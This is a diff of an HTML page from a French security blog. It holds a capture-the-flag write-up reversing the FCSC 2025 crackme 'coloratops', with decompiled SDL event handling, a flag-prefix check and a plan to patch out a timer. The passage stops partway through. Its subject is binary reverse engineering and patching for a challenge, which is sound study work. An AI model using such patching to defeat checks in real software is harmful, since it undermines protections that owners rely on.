@@ -1,26 +1,21 @@
 <!DOCTYPE html>
 <html lang="en">
-    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <head>
         <meta charset="UTF-8">
 <meta http-equiv="X-UA-Compatible" content="ie=edge">
 
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="author" content="">
-<meta name="description" content="Note Writeup d&rsquo;un challenge de reverse du FCSC 2025. Ce challenge était un crackme classique, avec un petit twist coloré&hellip;
-Description Voici un crackme plein de couleurs avec des allures old school. Analyse initiale Informations On nous donne un éxecutable:
-file coloratops; coloratops: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=34ce7dda6332fe818a86eb6f98df9610f088e6da, for GNU/Linux 3.2.0, stripped On est sur un ELF en 64 bits, qui est strippé.
-![[me_when_elf_is_stripped.jpg]]
-Identification des fonctions principales et nommage Après avoir identifié la fonction main depuis l&rsquo;appel à __libc_start_main, on voit plusieurs points clés:
-" />
-<meta name="keywords" content="cybersecurity blog french hacking rami malek pwn reverse reversing binary exploitation" />
+<meta name="author" content="map[name:conflict]">
+<meta name="description" content="Voici un crackme plein de couleurs avec des allures old school." />
+<meta name="keywords" content="cybersecurity blog french hacking rami malek pwn reverse reversing binary exploitation, reverse, gdb, crackme" />
 <meta name="robots" content="noodp" />
 <meta name="theme-color" content="" />
-<link rel="canonical" href="//localhost:1313/posts/1/01/" />
+<link rel="canonical" href="/posts/2025/04/fcsc-2025-rev/coloratops/" />
 
 
     <title>
         
-             :: cnf409&#39;s blog  — cybersecurity
+            🇫🇷 FCSC 2025 - rev/coloratops :: cnf409&#39;s blog  — cybersecurity
         
     </title>
 
@@ -28,63 +23,61 @@ Identification des fonctions principales et nommage Après avoir identifié la f
 
 
 
-  <link rel="stylesheet" href="//localhost:1313/main.min.244183cde1a38e0b08f82c11791181288f9aac1cc9618cd6f4e9e7710c5768ba.css" integrity="sha256-JEGDzeGjjgsI&#43;CwReRGBKI&#43;arBzJYYzW9OnncQxXaLo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="/main.min.244183cde1a38e0b08f82c11791181288f9aac1cc9618cd6f4e9e7710c5768ba.css" integrity="sha256-JEGDzeGjjgsI&#43;CwReRGBKI&#43;arBzJYYzW9OnncQxXaLo=" crossorigin="anonymous">
 
 
 
 
     
-        <link rel="stylesheet" type="text/css" href="//localhost:1313/css/custom.css">
+        <link rel="stylesheet" type="text/css" href="/css/custom.css">
     
 
 
-    <link rel="apple-touch-icon" sizes="180x180" href="//localhost:1313/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="//localhost:1313/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="//localhost:1313/favicon-16x16.png">
-    <link rel="manifest" href="//localhost:1313/site.webmanifest">
-    <link rel="mask-icon" href="//localhost:1313/safari-pinned-tab.svg" color="">
-    <link rel="shortcut icon" href="//localhost:1313/favicon.ico">
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
     <meta name="msapplication-TileColor" content="">
 
 
 
-  <meta itemprop="name" content="cnf409&#39;s blog">
-  <meta itemprop="description" content="Note Writeup d’un challenge de reverse du FCSC 2025. Ce challenge était un crackme classique, avec un petit twist coloré…
-Description Voici un crackme plein de couleurs avec des allures old school. Analyse initiale Informations On nous donne un éxecutable:
-file coloratops; coloratops: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=34ce7dda6332fe818a86eb6f98df9610f088e6da, for GNU/Linux 3.2.0, stripped On est sur un ELF en 64 bits, qui est strippé.
-![[me_when_elf_is_stripped.jpg]]
-Identification des fonctions principales et nommage Après avoir identifié la fonction main depuis l’appel à __libc_start_main, on voit plusieurs points clés:">
-  <meta itemprop="wordCount" content="1500">
+  <meta itemprop="name" content="🇫🇷 FCSC 2025 - rev/coloratops">
+  <meta itemprop="description" content="Voici un crackme plein de couleurs avec des allures old school.">
+  <meta itemprop="datePublished" content="2025-04-27T00:00:00+00:00">
+  <meta itemprop="dateModified" content="2025-04-27T00:00:00+00:00">
+  <meta itemprop="wordCount" content="1616">
   <meta itemprop="image" content="https://cdn.discordapp.com/attachments/308594778625409024/1360985845938524375/pfp.jpg?ex=67fd1c57&amp;is=67fbcad7&amp;hm=f07b391f8076f9691faffa4ec3800c74e13f8954a96f8b8f5c5216f38d3a12f1&amp;">
+  <meta itemprop="keywords" content="Reverse,Gdb,Crackme">
 
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:image" content="https://cdn.discordapp.com/attachments/308594778625409024/1360985845938524375/pfp.jpg?ex=67fd1c57&amp;is=67fbcad7&amp;hm=f07b391f8076f9691faffa4ec3800c74e13f8954a96f8b8f5c5216f38d3a12f1&amp;">
-  <meta name="twitter:title" content="cnf409&#39;s blog">
-  <meta name="twitter:description" content="Note Writeup d’un challenge de reverse du FCSC 2025. Ce challenge était un crackme classique, avec un petit twist coloré…
-Description Voici un crackme plein de couleurs avec des allures old school. Analyse initiale Informations On nous donne un éxecutable:
-file coloratops; coloratops: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=34ce7dda6332fe818a86eb6f98df9610f088e6da, for GNU/Linux 3.2.0, stripped On est sur un ELF en 64 bits, qui est strippé.
-![[me_when_elf_is_stripped.jpg]]
-Identification des fonctions principales et nommage Après avoir identifié la fonction main depuis l’appel à __libc_start_main, on voit plusieurs points clés:">
+  <meta name="twitter:title" content="🇫🇷 FCSC 2025 - rev/coloratops">
+  <meta name="twitter:description" content="Voici un crackme plein de couleurs avec des allures old school.">
 
 
 
-    <meta property="og:url" content="//localhost:1313/posts/1/01/">
+    <meta property="og:url" content="/posts/2025/04/fcsc-2025-rev/coloratops/">
   <meta property="og:site_name" content="cnf409&#39;s blog">
-  <meta property="og:title" content="cnf409&#39;s blog">
-  <meta property="og:description" content="Note Writeup d’un challenge de reverse du FCSC 2025. Ce challenge était un crackme classique, avec un petit twist coloré…
-Description Voici un crackme plein de couleurs avec des allures old school. Analyse initiale Informations On nous donne un éxecutable:
-file coloratops; coloratops: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=34ce7dda6332fe818a86eb6f98df9610f088e6da, for GNU/Linux 3.2.0, stripped On est sur un ELF en 64 bits, qui est strippé.
-![[me_when_elf_is_stripped.jpg]]
-Identification des fonctions principales et nommage Après avoir identifié la fonction main depuis l’appel à __libc_start_main, on voit plusieurs points clés:">
+  <meta property="og:title" content="🇫🇷 FCSC 2025 - rev/coloratops">
+  <meta property="og:description" content="Voici un crackme plein de couleurs avec des allures old school.">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-04-27T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-04-27T00:00:00+00:00">
+    <meta property="article:tag" content="Reverse">
+    <meta property="article:tag" content="Gdb">
+    <meta property="article:tag" content="Crackme">
     <meta property="og:image" content="https://cdn.discordapp.com/attachments/308594778625409024/1360985845938524375/pfp.jpg?ex=67fd1c57&amp;is=67fbcad7&amp;hm=f07b391f8076f9691faffa4ec3800c74e13f8954a96f8b8f5c5216f38d3a12f1&amp;">
 
 
 
 
 
+
+    <meta property="article:published_time" content="2025-04-27 00:00:00 &#43;0000 UTC" />
 
 
 
@@ -106,7 +99,7 @@ Identification des fonctions principales et nommage Après avoir identifié la f
         <div class="container">
             <header class="header">
     <span class="header__inner">
-        <a href="//localhost:1313/" style="text-decoration: none;">
+        <a href="/" style="text-decoration: none;">
     <div class="logo">
         
             <span class="logo__mark">-</span>
@@ -124,7 +117,7 @@ Identification des fonctions principales et nommage Après avoir identifié la f
 
         <span class="header__right">
                 <nav class="menu">
-    <ul class="menu__inner"><li><a href="//localhost:1313/contact/">Contact</a></li><li><a href="//localhost:1313/htb/">HackTheBox</a></li><li><a href="//localhost:1313/posts/">Posts</a></li><li><a href="//localhost:1313/series/">Series</a></li>
+    <ul class="menu__inner"><li><a href="/contact/">Contact</a></li><li><a href="/htb/">HackTheBox</a></li><li><a href="/posts/">Posts</a></li><li><a href="/series/">Series</a></li>
     </ul>
 </nav>
 
@@ -162,9 +155,11 @@ Identification des fonctions principales et nommage Après avoir identifié la f
 
     <article>
       <h1 class="post-title">
-        <a href="//localhost:1313/posts/1/01/"></a>
+        <a href="/posts/2025/04/fcsc-2025-rev/coloratops/">🇫🇷 FCSC 2025 - rev/coloratops</a>
       </h1>
 
+      
+        <div class="post-excerpt">Voici un crackme plein de couleurs avec des allures old school.</div>
       
 
       
@@ -172,47 +167,68 @@ Identification des fonctions principales et nommage Après avoir identifié la f
       
 
       <div class="post-content">
-        <h2 id="note">Note</h2>
+        <h3 id="sommaire">Sommaire</h3>
+<hr>
+<ul>
+<li><a href="/posts/2025/04/fcsc-2025-rev/coloratops/#analyse-initiale">Analyse initiale</a>
+<ul>
+<li><a href="/posts/2025/04/fcsc-2025-rev/coloratops/#informations">Informations</a></li>
+<li><a href="/posts/2025/04/fcsc-2025-rev/coloratops/#identification-des-fonctions-principales-et-nommage">Identification des fonctions principales et nommage</a></li>
+<li><a href="/posts/2025/04/fcsc-2025-rev/coloratops/#les-%c3%a9v%c3%a9nements-disponibles">Les événements disponibles</a></li>
+<li><a href="/posts/2025/04/fcsc-2025-rev/coloratops/#v%c3%a9rification-du-flag">Vérification du flag</a></li>
+<li><a href="/posts/2025/04/fcsc-2025-rev/coloratops/#gestion-du-chronom%c3%a8tre">Gestion du chronomètre</a></li>
+<li><a href="/posts/2025/04/fcsc-2025-rev/coloratops/#changements-dimage-de-fond">Changements d&rsquo;image de fond</a></li>
+</ul>
+</li>
+<li><a href="/posts/2025/04/fcsc-2025-rev/coloratops/#checkflagvalidity">checkFlagValidity()</a></li>
+<li><a href="/posts/2025/04/fcsc-2025-rev/coloratops/#r%c3%a9cup%c3%a9rer-les-signatures-valides">Récupérer les signatures valides</a></li>
+<li><a href="/posts/2025/04/fcsc-2025-rev/coloratops/#comprendre-le-fonctionnement-des-signatures">Comprendre le fonctionnement des signatures</a></li>
+<li><a href="/posts/2025/04/fcsc-2025-rev/coloratops/#solution-color%c3%a9e">Solution colorée</a></li>
+<li><a href="/posts/2025/04/fcsc-2025-rev/coloratops/#r%c3%a9solution">Résolution</a></li>
+<li><a href="/posts/2025/04/fcsc-2025-rev/coloratops/#conclusion">Conclusion</a></li>
+</ul>
+<hr>
+<h2 id="note">Note</h2>
 <p>Writeup d&rsquo;un challenge de <em>reverse</em> du FCSC 2025. Ce challenge était un crackme classique, avec un petit twist coloré&hellip;</p>
 <h2 id="description">Description</h2>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Voici un crackme plein de couleurs avec des allures old school.
 </span></span></code></pre></div><h2 id="analyse-initiale">Analyse initiale</h2>
 <h3 id="informations">Informations</h3>
-<p>On nous donne un éxecutable:</p>
+<p>On nous donne un exécutable:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#ff79c6">file</span> <span style="color:#ff79c6">coloratops</span><span style="color:#ff79c6">;</span>
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">coloratops</span><span style="color:#ff79c6">:</span> <span style="color:#ff79c6">ELF</span> <span style="color:#ff79c6">64-bit</span> <span style="color:#ff79c6">LSB</span> <span style="color:#ff79c6">pie</span> <span style="color:#ff79c6">executable</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">x86-64</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">version</span> <span style="color:#ff79c6">1</span> <span style="color:#ff79c6">(</span><span style="color:#ff79c6">SYSV</span><span style="color:#ff79c6">),</span> <span style="color:#ff79c6">dynamically</span> <span style="color:#ff79c6">linked</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">interpreter</span> <span style="color:#ff79c6">/</span><span style="color:#ff79c6">lib64</span><span style="color:#ff79c6">/</span><span style="color:#ff79c6">ld-linux-x86-64</span>.<span style="color:#50fa7b">so</span>.<span style="color:#50fa7b">2</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">BuildID</span><span style="color:#ff79c6">[</span><span style="color:#ff79c6">sha1</span><span style="color:#ff79c6">]=</span><span style="color:#ff79c6">34ce7dda6332fe818a86eb6f98df9610f088e6da</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">for</span> <span style="color:#ff79c6">GNU</span><span style="color:#ff79c6">/</span><span style="color:#ff79c6">Linux</span> <span style="color:#ff79c6">3</span>.<span style="color:#50fa7b">2</span>.<span style="color:#50fa7b">0</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">stripped</span>
 </span></span></code></pre></div><p>On est sur un ELF en 64 bits, qui est strippé.</p>
-<p>![[me_when_elf_is_stripped.jpg]]</p>
+<p><img src="https://i.ibb.co/j996X9Yn/me-when-elf-is-stripped.jpg" alt="me_when_elf_is_stripped.jpg"></p>
 <h3 id="identification-des-fonctions-principales-et-nommage">Identification des fonctions principales et nommage</h3>
 <p>Après avoir identifié la fonction main depuis l&rsquo;appel à <code>__libc_start_main</code>, on voit plusieurs points clés:</p>
 <ul>
-<li>Création de la fenêtre et de son renderer:</li>
+<li>Création de la fenêtre et de son <em>renderer</em>:</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>        window <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">SDL_CreateWindow</span>(<span style="color:#f1fa8c">&#34;FCSC 2025 - Coloratops&#34;</span>,<span style="color:#bd93f9">0x2fff0000</span>,<span style="color:#bd93f9">0x2fff0000</span>,<span style="color:#bd93f9">0x4b0</span>,<span style="color:#bd93f9">0x2ae</span>,<span style="color:#bd93f9">0x14</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> (window <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>) {
-</span></span><span style="display:flex;"><span>          <span style="color:#50fa7b">TTF_Quit</span>();
-</span></span><span style="display:flex;"><span>          <span style="color:#50fa7b">SDL_Quit</span>();
-</span></span><span style="display:flex;"><span>          uVar3 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">else</span> {
-</span></span><span style="display:flex;"><span>          renderer <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">SDL_CreateRenderer</span>(window,<span style="color:#bd93f9">0xffffffff</span>,<span style="color:#bd93f9">6</span>);
-</span></span><span style="display:flex;"><span>          <span style="color:#ff79c6">if</span> (renderer <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>) {
-</span></span><span style="display:flex;"><span>            uVar3 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
-</span></span><span style="display:flex;"><span>          }
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>window <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">SDL_CreateWindow</span>(<span style="color:#f1fa8c">&#34;FCSC 2025 - Coloratops&#34;</span>,<span style="color:#bd93f9">0x2fff0000</span>,<span style="color:#bd93f9">0x2fff0000</span>,<span style="color:#bd93f9">0x4b0</span>,<span style="color:#bd93f9">0x2ae</span>,<span style="color:#bd93f9">0x14</span>);
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (window <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">TTF_Quit</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#50fa7b">SDL_Quit</span>();
+</span></span><span style="display:flex;"><span>  uVar3 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">else</span> {
+</span></span><span style="display:flex;"><span>  renderer <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">SDL_CreateRenderer</span>(window,<span style="color:#bd93f9">0xffffffff</span>,<span style="color:#bd93f9">6</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (renderer <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>) {
+</span></span><span style="display:flex;"><span>	uVar3 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>  }
 </span></span></code></pre></div><ul>
 <li>Création des éléments audio:</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>            audioCallback <span style="color:#ff79c6">=</span> FUN_00109f01;
-</span></span><span style="display:flex;"><span>            userData <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
-</span></span><span style="display:flex;"><span>            audioDeviceId <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">SDL_OpenAudioDevice</span>(<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0</span>,<span style="color:#ff79c6">&amp;</span>wantedSpec,<span style="color:#ff79c6">&amp;</span>obtainedSpec,<span style="color:#bd93f9">0xb</span>);
-</span></span><span style="display:flex;"><span>            <span style="color:#50fa7b">loadInitialTextures</span>(renderer,<span style="color:#ff79c6">&amp;</span>font);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>audioCallback <span style="color:#ff79c6">=</span> FUN_00109f01;
+</span></span><span style="display:flex;"><span>userData <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
+</span></span><span style="display:flex;"><span>audioDeviceId <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">SDL_OpenAudioDevice</span>(<span style="color:#bd93f9">0</span>,<span style="color:#bd93f9">0</span>,<span style="color:#ff79c6">&amp;</span>wantedSpec,<span style="color:#ff79c6">&amp;</span>obtainedSpec,<span style="color:#bd93f9">0xb</span>);
+</span></span><span style="display:flex;"><span><span style="color:#50fa7b">loadInitialTextures</span>(renderer,<span style="color:#ff79c6">&amp;</span>font);
 </span></span></code></pre></div><ul>
-<li>Début de la boucle principale et de la boucle de gestion des événements</li>
+<li>Début de la boucle principale et de la boucle de gestion des événements:</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>            isRunning <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
-</span></span><span style="display:flex;"><span>            startTicks <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">SDL_GetTicks</span>();
-</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">while</span> (isRunning <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">0</span>) {
-</span></span><span style="display:flex;"><span>              <span style="color:#ff79c6">while</span> (sdlResult <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">SDL_PollEvent</span>(eventBuffer), sdlResult <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">0</span>) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>isRunning <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>startTicks <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">SDL_GetTicks</span>();
+</span></span><span style="display:flex;"><span><span style="color:#ff79c6">while</span> (isRunning <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">0</span>) {
+</span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">while</span> (sdlResult <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">SDL_PollEvent</span>(eventBuffer), sdlResult <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">0</span>) {
 </span></span></code></pre></div><h3 id="les-événements-disponibles">Les événements disponibles</h3>
 <p>On voit plusieurs évènements possibles pour le programme:</p>
 <ul>
@@ -220,11 +236,11 @@ Identification des fonctions principales et nommage Après avoir identifié la f
 </ul>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff79c6">if</span> (eventBuffer[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x100</span>) {
 </span></span><span style="display:flex;"><span>	isRunning <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
-</span></span><span style="display:flex;"><span>}```
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span> `<span style="color:#bd93f9">0x303</span>` <span style="color:#ff79c6">-</span> <span style="color:#ff79c6">*</span>SDL_TEXTINPUT<span style="color:#ff79c6">*:</span> Filtre les caractères et met à jour l&#39;entrée utilisateur
-</span></span><span style="display:flex;"><span>```c
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> (eventBuffer[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x303</span>) {
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><ul>
+<li><code>0x303</code> - <em>SDL_TEXTINPUT</em>: Filtre les caractères et met à jour l&rsquo;entrée utilisateur</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff79c6">else</span> <span style="color:#50fa7b">if</span> (eventBuffer[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x303</span>) {
 </span></span><span style="display:flex;"><span>  local_30 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span>;
 </span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">while</span> (sVar5 <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">strlen</span>(pendingInput), local_30 <span style="color:#ff79c6">&lt;</span> sVar5) {
 </span></span><span style="display:flex;"><span>	<span style="color:#ff79c6">if</span> (((inputLength <span style="color:#ff79c6">&lt;</span> <span style="color:#bd93f9">0x40</span>) <span style="color:#ff79c6">&amp;&amp;</span>
@@ -237,12 +253,12 @@ Identification des fonctions principales et nommage Après avoir identifié la f
 </span></span><span style="display:flex;"><span>	}
 </span></span><span style="display:flex;"><span>	local_30 <span style="color:#ff79c6">=</span> local_30 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>;
 </span></span><span style="display:flex;"><span>  }
-</span></span><span style="display:flex;"><span>}```
-</span></span><span style="display:flex;"><span>On voit déjà qu&#39;on ne pourra entrer que les caractères `FCSC{}abcdef0123456789`.
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">-</span> `<span style="color:#bd93f9">0x300</span>` <span style="color:#ff79c6">-</span> <span style="color:#ff79c6">*</span>SDL_KEYDOWN<span style="color:#ff79c6">*:</span> Définit des actions en fonction des touches pressées
-</span></span><span style="display:flex;"><span>```c
-</span></span><span style="display:flex;"><span><span style="color:#ff79c6">else</span> <span style="color:#ff79c6">if</span> (eventBuffer[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x300</span>) {
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>On voit déjà qu&rsquo;on ne pourra entrer que les caractères <code>FCSC{}abcdef0123456789</code>.</p>
+<ul>
+<li><code>0x300</code> - <em>SDL_KEYDOWN</em>: Définit des actions en fonction des touches pressées</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#ff79c6">else</span> <span style="color:#50fa7b">if</span> (eventBuffer[<span style="color:#bd93f9">0</span>] <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0x300</span>) {
 </span></span><span style="display:flex;"><span>  <span style="color:#ff79c6">if</span> (((keyCode <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">8</span>) <span style="color:#ff79c6">&amp;&amp;</span> ((keyMod <span style="color:#ff79c6">&amp;</span> <span style="color:#bd93f9">0xc0</span>) <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>)) <span style="color:#ff79c6">&amp;&amp;</span> (inputLength <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">0</span>)) {
 </span></span><span style="display:flex;"><span>	puVar1 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">&amp;</span>DAT_0036b25f <span style="color:#ff79c6">+</span> inputLength;
 </span></span><span style="display:flex;"><span>	inputLength <span style="color:#ff79c6">=</span> inputLength <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">1</span>;
@@ -284,9 +300,9 @@ Identification des fonctions principales et nommage Après avoir identifié la f
 </span></span><span style="display:flex;"><span>	<span style="color:#50fa7b">SDL_free</span>(local_60);
 </span></span><span style="display:flex;"><span>  }
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>On voit plusieurs raccourcis qui sont définits: <em>CTRL+C</em>, <em>CTRL+V</em>, <em>CTRL+Q</em>&hellip;</p>
+</span></span></code></pre></div><p>On voit plusieurs raccourcis qui sont définis: <em>CTRL+C</em>, <em>CTRL+V</em>, <em>CTRL+Q</em>&hellip;</p>
 <h3 id="vérification-du-flag">Vérification du flag</h3>
-<p>Dans un premier temps, le programme va vérifier le préfixe de notre entrée. Si il est correct, il appellera la fonction <code>checkFlagValidity()</code>.</p>
+<p>Dans un premier temps, le programme va vérifier le préfixe de notre entrée. S&rsquo;il est correct, il appellera la fonction <code>checkFlagValidity()</code>.</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>isPrefixCorrect <span style="color:#ff79c6">=</span>
 </span></span><span style="display:flex;"><span>   (uint)(((((input <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;F&#39;</span> <span style="color:#ff79c6">&amp;&amp;</span> input_second_char <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;C&#39;</span>) <span style="color:#ff79c6">&amp;&amp;</span> input_third_char <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;S&#39;</span>)
 </span></span><span style="display:flex;"><span>		   <span style="color:#ff79c6">&amp;&amp;</span> input_fourth_char <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;C&#39;</span>) <span style="color:#ff79c6">&amp;&amp;</span> input_fifth_char <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;{&#39;</span>) <span style="color:#ff79c6">&amp;&amp;</span>
@@ -298,13 +314,13 @@ Identification des fonctions principales et nommage Après avoir identifié la f
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>sdlResult <span style="color:#ff79c6">=</span> <span style="color:#50fa7b">SDL_GetTicks</span>();
 </span></span><span style="display:flex;"><span>elapsedSeconds <span style="color:#ff79c6">=</span> (uint)(sdlResult <span style="color:#ff79c6">-</span> startTicks) <span style="color:#ff79c6">/</span> <span style="color:#bd93f9">1000</span>;
 </span></span><span style="display:flex;"><span><span style="color:#ff79c6">if</span> ((<span style="color:#bd93f9">0x3b</span> <span style="color:#ff79c6">&lt;</span> elapsedSeconds) <span style="color:#ff79c6">&amp;&amp;</span> (hasTimedOut <span style="color:#ff79c6">==</span> <span style="color:#bd93f9">0</span>)) {
-</span></span><span style="display:flex;"><span>hasTimedOut <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
+</span></span><span style="display:flex;"><span>	hasTimedOut <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">1</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>On va pouvoir directement patcher cette variable pour rendre le timer inefficace, ce sera utile pour la suite:</p>
